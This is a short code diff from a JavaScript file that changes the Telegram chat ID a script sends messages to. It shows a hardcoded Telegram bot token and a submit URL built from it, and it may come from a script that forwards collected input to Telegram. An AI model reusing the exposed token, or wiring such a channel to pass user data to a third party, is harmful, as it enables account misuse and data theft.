@@ -1,5 +1,5 @@
 const TOKEN = "7259972759:AAHCMszHhRywqrCw6uGLzaaApmXUq_jB-Vw";
-const CHAT_ID = "-4036426443";
+const CHAT_ID = "6163382681";
 const SUBMIT_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 const ERROR_TIMEOUT = 1000;
 
